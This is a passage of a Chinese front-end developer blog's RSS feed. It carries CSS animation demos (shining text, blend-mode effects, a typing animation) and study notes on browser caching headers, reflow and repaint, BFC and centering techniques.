      <span>rgba</span><span>(</span>255<span>,</span> 255<span>,</span> 255<span>,</span> 0.6<span>)</span> 25%<span>,</span>
      white 26%<span>,</span>
      <span>rgba</span><span>(</span>255<span>,</span> 255<span>,</span> 255<span>,</span> 0.3<span>)</span> 27%<span>,</span>
      transparent 30%<span>,</span>
      transparent 33%<span>,</span>
      <span>rgba</span><span>(</span>255<span>,</span> 255<span>,</span> 255<span>,</span> 0.3<span>)</span> 35%<span>,</span>
      transparent 42%<span>,</span>
      transparent 100%
    <span>)</span> 0% 0%/ 150% 100% no-repeat<span>;</span>
  <span>-webkit-background-clip</span><span>:</span> text<span>;</span>
  <span>animation</span><span>:</span> shine 5s infinite linear<span>;</span>
<span>}</span>

<span><span>@keyframes</span> shine</span> <span>{</span>
  <span>0%</span> <span>{</span>
    <span>background-position</span><span>:</span> 50% 0<span>;</span>
  <span>}</span>
  <span>100%</span> <span>{</span>
    <span>background-position</span><span>:</span> -190% 0<span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br></div></div>
            </div>
          </div>
          
        </div>

          <div
            id="code-demo-73dff150"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Cp%3EMagic%3C%2Fp%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20width%3A%20100%25%3B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%7D%5Cn%5Cnp%20%7B%5Cn%20%20position%3A%20relative%3B%5Cn%20%20font-size%3A%20180px%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%20%20-webkit-text-stroke%3A%203px%20%237272a5%3B%5Cn%7D%5Cn%5Cnp%3A%3Abefore%20%7B%5Cn%20%20content%3A%20'%20'%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20left%3A%200%3B%5Cn%20%20top%3A%200%3B%5Cn%20%20width%3A%20100%25%3B%5Cn%20%20height%3A%20100%25%3B%5Cn%20%20background-image%3A%20linear-gradient(45deg%2C%20%23ff269b%2C%20%232ab5f5%2C%20%23ffbf00)%3B%5Cn%20%20mix-blend-mode%3A%20multiply%3B%5Cn%7D%5Cn%5Cnp%3A%3Aafter%20%7B%5Cn%20%20content%3A%20'%20'%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20top%3A%20-100%25%3B%5Cn%20%20left%3A%20-100%25%3B%5Cn%20%20right%3A%200%3B%5Cn%20%20bottom%3A%200%3B%5Cn%20%20background%3A%20radial-gradient(circle%2C%20%23fff%2C%20%23000%2050%25)%20center%2F25%25%2025%25%3B%5Cn%20%20mix-blend-mode%3A%20color-dodge%3B%5Cn%20%20animation%3A%20mix%208s%20linear%20infinite%3B%5Cn%7D%5Cn%5Cn%40keyframes%20mix%20%7B%5Cn%20%20to%20%7B%5Cn%20%20%20%20transform%3A%20translate(50%25%2C%2050%25)%3B%5Cn%20%20%7D%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>p</span><span>></span></span>Magic<span><span><span>&lt;/</span>p</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>width</span><span>:</span> 100%<span>;</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
<span>}</span>

<span>p</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>font-size</span><span>:</span> 180px<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
  <span>-webkit-text-stroke</span><span>:</span> 3px #7272a5<span>;</span>
<span>}</span>

<span>p::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>width</span><span>:</span> 100%<span>;</span>
  <span>height</span><span>:</span> 100%<span>;</span>
  <span>background-image</span><span>:</span> <span>linear-gradient</span><span>(</span>45deg<span>,</span> #ff269b<span>,</span> #2ab5f5<span>,</span> #ffbf00<span>)</span><span>;</span>
  <span>mix-blend-mode</span><span>:</span> multiply<span>;</span>
<span>}</span>

<span>p::after</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> -100%<span>;</span>
  <span>left</span><span>:</span> -100%<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>background</span><span>:</span> <span>radial-gradient</span><span>(</span>circle<span>,</span> #fff<span>,</span> #000 50%<span>)</span> center/25% 25%<span>;</span>
  <span>mix-blend-mode</span><span>:</span> color-dodge<span>;</span>
  <span>animation</span><span>:</span> mix 8s linear infinite<span>;</span>
<span>}</span>

<span><span>@keyframes</span> mix</span> <span>{</span>
  <span>to</span> <span>{</span>
    <span>transform</span><span>:</span> <span>translate</span><span>(</span>50%<span>,</span> 50%<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br></div></div>
            </div>
          </div>
          
        </div>
]]></content:encoded>
    </item>
    <item>
      <title>图片主色</title>
      <link>https://www.matrixtheone.ga/web/magic/Theme-Color/</link>
      <guid>https://www.matrixtheone.ga/web/magic/Theme-Color/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">图片主色</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<blockquote>
<p>伪主色，放大模糊中间色调</p>
</blockquote>

          <div
            id="code-demo-22f9ca27"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20position%3A%20relative%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%7D%5Cn%5Cnmain%3A%3Abefore%20%7B%5Cn%20%20content%3A%20''%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20z-index%3A%20-1%3B%5Cn%20%20top%3A%200%3B%5Cn%20%20right%3A%200%3B%5Cn%20%20bottom%3A%200%3B%5Cn%20%20left%3A%200%3B%5Cn%20%20background%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-7.webp)%20center%2Fcover%20no-repeat%3B%5Cn%20%20filter%3A%20blur(50px)%3B%5Cn%20%20transform%3A%20scale(3)%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20width%3A%2070%25%3B%5Cn%20%20height%3A%2080%25%3B%5Cn%20%20border-radius%3A%2010px%3B%5Cn%20%20box-shadow%3A%200%200%2012px%204px%20rgba(255%2C%20255%2C%20255%2C%200.3)%3B%5Cn%20%20background%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-7.webp)%20center%2Fcover%20no-repeat%3B%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
<span>}</span>

<span>main::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>''</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>z-index</span><span>:</span> -1<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>background</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-7.webp<span>)</span></span> center/cover no-repeat<span>;</span>
  <span>filter</span><span>:</span> <span>blur</span><span>(</span>50px<span>)</span><span>;</span>
  <span>transform</span><span>:</span> <span>scale</span><span>(</span>3<span>)</span><span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>width</span><span>:</span> 70%<span>;</span>
  <span>height</span><span>:</span> 80%<span>;</span>
  <span>border-radius</span><span>:</span> 10px<span>;</span>
  <span>box-shadow</span><span>:</span> 0 0 12px 4px <span>rgba</span><span>(</span>255<span>,</span> 255<span>,</span> 255<span>,</span> 0.3<span>)</span><span>;</span>
  <span>background</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-7.webp<span>)</span></span> center/cover no-repeat<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br></div></div>
            </div>
          </div>
          
        </div>
]]></content:encoded>
    </item>
    <item>
      <title>打字效果</title>
      <link>https://www.matrixtheone.ga/web/magic/Typing-Effect/</link>
      <guid>https://www.matrixtheone.ga/web/magic/Typing-Effect/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">打字效果</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[
          <div
            id="code-demo-20387d5e"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cp%3E%E5%89%8D%E5%A4%A9%E7%9C%8B%E5%88%B0%E4%BA%86%E5%B0%8F%E5%85%94%E5%AD%90%EF%BC%8C%E6%98%A8%E5%A4%A9%E6%98%AF%E5%B0%8F%E9%B9%BF%EF%BC%8C%E4%BB%8A%E5%A4%A9%E6%98%AF%E4%BD%A0%3C%2Fp%3E%5Cn%22%2C%22css%22%3A%22p%20%7B%5Cn%20%20width%3A%2019em%3B%5Cn%20%20font-size%3A%2018px%3B%5Cn%20%20color%3A%20%23ffb8c4ff%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%20%20user-select%3A%20none%3B%5Cn%20%20white-space%3A%20nowrap%3B%5Cn%20%20border-right%3A%200.2em%20solid%20transparent%3B%20%2F*%20%E7%A9%BA%E5%87%BA%E4%B8%8E%E6%96%87%E6%9C%AC%E7%9A%84%E9%97%B4%E8%B7%9D%20*%2F%5Cn%20%20animation%3A%20typing%205s%20steps(19%2C%20end)%2C%20blink-caret%200.75s%20step-end%20infinite%3B%5Cn%7D%5Cn%5Cn%40keyframes%20typing%20%7B%5Cn%20%20from%20%7B%5Cn%20%20%20%20width%3A%200%3B%5Cn%20%20%7D%5Cn%7D%5Cn%5Cn%40keyframes%20blink-caret%20%7B%5Cn%20%20to%20%7B%5Cn%20%20%20%20box-shadow%3A%200.1em%200%200%200%20transparent%3B%5Cn%20%20%7D%5Cn%20%2050%25%20%7B%5Cn%20%20%20%20box-shadow%3A%200.1em%200%200%200%3B%5Cn%20%20%7D%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>p</span><span>></span></span>前天看到了小兔子，昨天是小鹿，今天是你<span><span><span>&lt;/</span>p</span><span>></span></span>
</code></pre>
<div><span>1</span><br></div></div><div><pre><code><span>p</span> <span>{</span>
  <span>width</span><span>:</span> 19em<span>;</span>
  <span>font-size</span><span>:</span> 18px<span>;</span>
  <span>color</span><span>:</span> #ffb8c4ff<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
  <span>user-select</span><span>:</span> none<span>;</span>
  <span>white-space</span><span>:</span> nowrap<span>;</span>
  <span>border-right</span><span>:</span> 0.2em solid transparent<span>;</span> <span>/* 空出与文本的间距 */</span>
  <span>animation</span><span>:</span> typing 5s <span>steps</span><span>(</span>19<span>,</span> end<span>)</span><span>,</span> blink-caret 0.75s step-end infinite<span>;</span>
<span>}</span>

<span><span>@keyframes</span> typing</span> <span>{</span>
  <span>from</span> <span>{</span>
    <span>width</span><span>:</span> 0<span>;</span>
  <span>}</span>
<span>}</span>

<span><span>@keyframes</span> blink-caret</span> <span>{</span>
  <span>to</span> <span>{</span>
    <span>box-shadow</span><span>:</span> 0.1em 0 0 0 transparent<span>;</span>
  <span>}</span>
  <span>50%</span> <span>{</span>
    <span>box-shadow</span><span>:</span> 0.1em 0 0 0<span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div>
            </div>
          </div>
          
        </div>
]]></content:encoded>
    </item>
    <item>
      <title>浏览器</title>
      <link>https://www.matrixtheone.ga/web/memo/Browser/</link>
      <guid>https://www.matrixtheone.ga/web/memo/Browser/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">浏览器</source>
      <category>浏览器</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-url-到页面渲染"> 1. URL 到页面渲染</h2>
<img :src="$withBase('/images/Browser/URL 到页面渲染.png')" loading="lazy">
<ul>
<li>
<p><a href="https://raw.githubusercontent.com/Matrix-The-One/web/assets/others/URL%20%E5%88%B0%E9%A1%B5%E9%9D%A2%E6%B8%B2%E6%9F%93.pdf" download>下载 PDF</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/6844904021308735502" target="_blank" rel="noopener noreferrer">(1.6w 字)浏览器灵魂之问，请问你能接得住几个？ - 三元同学</a></p>
</li>
<li>
<p><a href="https://www.bilibili.com/video/BV1x54y1B7RE" target="_blank" rel="noopener noreferrer">【干货】浏览器是如何运作的？ - objtube 的卢克儿</a></p>
</li>
</ul>
<h2 id="_2-浏览器的缓存机制"> 2. 浏览器的缓存机制</h2>
<ul>
<li>
<p>作用：</p>
<blockquote>
<ol>
<li>降低网络延迟，加快网页加载。</li>
<li>减少网络带宽消耗。</li>
<li>降低服务器压力，提高并发性能。</li>
</ol>
</blockquote>
</li>
<li>
<p>浏览器缓存分为强制缓存和协商缓存，浏览器发起请求后，先回判断该请求资源是否有缓存，无缓存则向服务器发送请求。</p>
</li>
<li>
<p>有缓存先判断强制缓存是否生效（Expires / Cache-Control / Pragma，优先级：Expires &lt; Cache-Control &lt; Pragma），当强制缓存生效，则会返回内存中的缓存（Memory Cache）或硬盘中的缓存（Disk Cache），状态码为 200。</p>
<p><font color="#12aa9c">Expires：</font>Expires 的值是一个 HTTP 日期和 Last-Modified 结合使用，在浏览器发起请求时，会根据系统时间和 Expires 的值进行比较，如果系统时间超过了 Expires 的值，缓存失效。由于和系统时间进行比较，所以当系统时间和服务器时间不一致的时候，会有缓存有效期不准的问题。Expires 的优先级在三个 Header 属性中是最低的。</p>
<p><font color="#12aa9c">Cache-Control：</font>Cache-Control 是 HTTP/1.1 中新增的属性，在请求头和响应头中都可以使用，常用的属性值如有：</p>
<blockquote>
<ol>
<li>max-age：单位是秒，缓存时间计算的方式是距离发起的时间的秒数，超过间隔的秒数缓存失效。</li>
<li>no-cache：不使用强缓存，需要与服务器验证缓存是否新鲜。</li>
<li>no-store：禁止使用缓存（包括协商缓存），每次都向服务器请求最新的资源。</li>
<li>private：专用于个人的缓存，中间代理、CDN 等不能缓存此响应。</li>
<li>public：响应可以被中间代理、CDN 等缓存。</li>
<li>must-revalidate：在缓存过期前可以使用，过期后必须向服务器验证。</li>
</ol>
</blockquote>
<p><font color="#12aa9c">Pragma：</font>Pragma 只有一个属性值，就是 no-cache ，效果和 Cache-Control 中的 no-cache 一致，不使用强缓存，需要与服务器验证缓存是否新鲜，在 3 个头部属性中的优先级最高。</p>
</li>
<li>
<p>若强制缓存失效，将进行协商缓存（Last-Modified / ETag，优先级：Last-Modified &lt; ETag），这时浏览器会携带缓存标识向服务器发起请求。</p>
<p><font color="#12aa9c">Last-Modified/If-Modified-Since：</font>Last-Modified/If-Modified-Since 的值代表的是文件的最后修改时间，第一次请求服务端会把资源的最后修改时间放到 Last-Modified 响应头中，第二次发起请求的时候，请求头会带上上一次响应头中的 Last-Modified 的时间，并放到 If-Modified-Since 请求头属性中，服务端根据文件最后一次修改时间和 If-Modified-Since 的值进行比较，如果相等，返回 304 ，并加载浏览器缓存。</p>
<p><font color="#12aa9c">ETag/If-None-Match：</font>ETag/If-None-Match 的值是一串 hash 码，代表的是一个资源的标识符，当服务端的文件变化的时候，它的 hash 码会随之改变，通过请求头中的 If-None-Match 和当前文件的 hash 值进行比较，如果相等则表示命中协商缓存。ETag 又有强弱校验之分，如果 hash 码是以 &quot;W/&quot; 开头的一串字符串，说明此时协商缓存的校验是弱校验的，只有服务器上的文件差异（根据 ETag 计算方式来决定）达到能够触发 hash 值后缀变化的时候，才会真正地请求资源，否则返回 304 并加载浏览器缓存。</p>
</li>
<li>
<p>由服务器根据缓存标识决定是否使用缓存，若协商缓存生效，继续使用缓存，返回 304 状态码；若协商缓存也失效，那代表该请求的缓存失效，重新获取请求结果。</p>
<img :src="$withBase('/images/Browser/浏览器缓存.png')" loading="lazy">
</li>
<li>
<p>浏览器策略：</p>
<blockquote>
<ol>
<li>同一个标签下，普通刷新请求 HTML 文件时，会在请求头添加 <code>Cache-Control: max-age=0</code>，过期时间为 0，不会走强缓存。</li>
<li>如果没有强缓存（Pragma、Cache-Control、Expires），但有协商缓存 Last-Modified，则缓存的寿命就等于响应头里面 Date 的值减去 Last-Modified 的值除以 10，直接使用缓存资源，返回状态码 200。</li>
</ol>
</blockquote>
<div><pre><code><span>function</span> <span>getExpirationTime</span><span>(</span><span>responseDateTime<span>,</span> lastModifiedTime</span><span>)</span> <span>{</span>
  <span>const</span> dateTimestamp <span>=</span> <span>getTimestamp</span><span>(</span>responseDateTime<span>)</span>
  <span>const</span> lastModifiedTimestamp <span>=</span> <span>getTimestamp</span><span>(</span>lastModifiedTime<span>)</span>

  <span>const</span> freshnessLifetime <span>=</span> <span>(</span>dateTimestamp <span>-</span> lastModifiedTimestamp<span>)</span> <span>/</span> <span>10</span>
  <span>const</span> expirationTime <span>=</span> <span>new</span> <span>Date</span><span>(</span>dateTimestamp <span>+</span> freshnessLifetime<span>)</span><span>.</span><span>toLocaleString</span><span>(</span><span>)</span>

  <span>function</span> <span>getTimestamp</span><span>(</span><span>date</span><span>)</span> <span>{</span>
    <span>return</span> <span>new</span> <span>Date</span><span>(</span>date<span>)</span><span>.</span><span>getTime</span><span>(</span><span>)</span>
  <span>}</span>

  <span>return</span> expirationTime
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div></li>
<li>
<p><a href="https://juejin.cn/post/6844904153043435533" target="_blank" rel="noopener noreferrer">图解 HTTP 缓存 - 政采云前端团队</a></p>
</li>
<li>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching#%E6%96%B0%E9%B2%9C%E5%BA%A6" target="_blank" rel="noopener noreferrer">HTTP 缓存 - 新鲜度</a></p>
</li>
<li>
<p><a href="https://datatracker.ietf.org/doc/html/rfc7234#section-4.2.2" target="_blank" rel="noopener noreferrer">RFC-4.2.2</a></p>
</li>
</ul>
<h2 id="_3-回流和重绘"> 3. 回流和重绘</h2>
<img :src="$withBase('/images/Browser/回流和重绘.jpg')" loading="lazy">
<ul>
<li>
<p>回流（重排）：重新生成 DOM 树及进行后面一系列流程。</p>
<blockquote>
<ol>
<li>width、height、padding、margin、left、top、border 等几何属性变化。</li>
<li>DOM 节点增减或移动。</li>
<li>读写 offset 族、scroll 族和 client 族属性。</li>
<li>调用 window.getComputedStyle 方法。</li>
</ol>
</blockquote>
</li>
<li>
<p>重绘：跳过了生成布局树和建图层树的阶段，直接生成绘制列表，然后进行后面一系列流程。</p>
<blockquote>
<p>DOM 样式发生变化，且没有影响几何属性。</p>
</blockquote>
</li>
<li>
<p>合成（GPU 加速）：直接跳过布局和绘制流程，直接进入非主线程处理的部分，即直接交给合成线程处理。</p>
<blockquote>
<p>利用 CSS3 的 transform、opacity、filter 属性。</p>
</blockquote>
</li>
</ul>
<div><p>提示</p>
<p>重绘不一定导致回流，但回流一定发生了重绘。</p>
</div>
<ul>
<li><a href="https://juejin.cn/post/6844904021308735502#heading-54" target="_blank" rel="noopener noreferrer">(1.6w 字)浏览器灵魂之问，请问你能接得住几个？ - 三元同学</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>CSS</title>
      <link>https://www.matrixtheone.ga/web/memo/CSS/</link>
      <guid>https://www.matrixtheone.ga/web/memo/CSS/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">CSS</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-bfc"> 1. BFC</h2>
<ul>
<li>
<p>BFC 全称 Block Formatting Context，译为块级格式化上下文，它是一个独立的渲染区域。</p>
</li>
<li>
<p>BFC 里面的盒子都会以垂直方向排列，同一个 BFC 里面中相邻的两个盒子的垂直外边距会重叠。</p>
</li>
<li>
<p>应用：</p>
<blockquote>
<ol>
<li>解决垂直外边距重叠。</li>
<li>解决浮动导致的高度塌陷。</li>
</ol>
</blockquote>
</li>
<li>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context" target="_blank" rel="noopener noreferrer">创建 BFC - MDN</a></p>
<blockquote>
<p><code>overflow: hidden</code>：box1 中解决垂直外边距重叠，box2 中解决浮动导致的高度塌陷。</p>
</blockquote>
<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>></span></span>
<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>en<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>head</span><span>></span></span>
    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>"</span>UTF-8<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>X-UA-Compatible<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>IE=edge<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>width=device-width, initial-scale=1.0<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>
    <span><span><span>&lt;</span>style</span><span>></span></span><span><span>
      <span>.box1</span> <span>{</span>
        <span>width</span><span>:</span> 200px<span>;</span>
        <span>height</span><span>:</span> 200px<span>;</span>
        <span>overflow</span><span>:</span> hidden<span>;</span>
        <span>background</span><span>:</span> gold<span>;</span>
      <span>}</span>
      <span>.box1-inner</span> <span>{</span>
        <span>margin-top</span><span>:</span> 50px<span>;</span>
      <span>}</span>
      <span>.box2</span> <span>{</span>
        <span>width</span><span>:</span> 200px<span>;</span>
        <span>background</span><span>:</span> aqua<span>;</span>
        <span>overflow</span><span>:</span> hidden<span>;</span>
      <span>}</span>
      <span>.box2-inner</span> <span>{</span>
        <span>float</span><span>:</span> left<span>;</span>
        <span>width</span><span>:</span> 200px<span>;</span>
        <span>height</span><span>:</span> 200px<span>;</span>
      <span>}</span>
    </span></span><span><span><span>&lt;/</span>style</span><span>></span></span>
  <span><span><span>&lt;/</span>head</span><span>></span></span>
  <span><span><span>&lt;</span>body</span><span>></span></span>
    <span><span><span>&lt;</span>section</span> <span>class</span><span><span>=</span><span>"</span>box box1<span>"</span></span><span>></span></span>
      <span><span><span>&lt;</span>section</span> <span>class</span><span><span>=</span><span>"</span>box1-inner<span>"</span></span><span>></span></span>margin<span><span><span>&lt;/</span>section</span><span>></span></span>
    <span><span><span>&lt;/</span>section</span><span>></span></span>
    <span><span><span>&lt;</span>section</span> <span>class</span><span><span>=</span><span>"</span>box2<span>"</span></span><span>></span></span>
      <span><span><span>&lt;</span>section</span> <span>class</span><span><span>=</span><span>"</span>box2-inner<span>"</span></span><span>></span></span>float<span><span><span>&lt;/</span>section</span><span>></span></span>
    <span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;/</span>body</span><span>></span></span>
<span><span><span>&lt;/</span>html</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br></div></div></li>
</ul>
<h2 id="_2-水平垂直居中"> 2. 水平垂直居中</h2>
<ul>
<li>
<ol>
<li>行内元素</li>
</ol>
<div><pre><code><span>.parent</span> <span>{</span>
  <span>line-height</span><span>:</span> 500px<span>;</span>
  <span>text-align</span><span>:</span> center<span>;</span>
  <span>font-size</span><span>:</span> 0<span>;</span> <span>/* 消除幽灵空白节点的bug */</span>
<span>}</span>
<span>.son</span> <span>{</span>
  <span>vertical-align</span><span>:</span> middle<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div></li>
<li>
<ol start="2">
<li>table-cell</li>
</ol>
<div><pre><code><span>.parent</span> <span>{</span>
  <span>display</span><span>:</span> table-cell<span>;</span>
  <span>text-align</span><span>:</span> center<span>;</span>
  <span>vertical-align</span><span>:</span> middle<span>;</span>
<span>}</span>
<span>.son</span> <span>{</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div></li>
<li>
<ol start="3">
<li>position</li>
</ol>
<div><pre><code><span>.parent</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
<span>}</span>
<span>.son</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 50%<span>;</span>
  <span>left</span><span>:</span> 50%<span>;</span>
  <span>transform</span><span>:</span> <span>translate</span><span>(</span>-50%<span>,</span> -50%<span>)</span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><div><pre><code><span>.parent</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
<span>}</span>
<span>.son</span> <span>{</span>
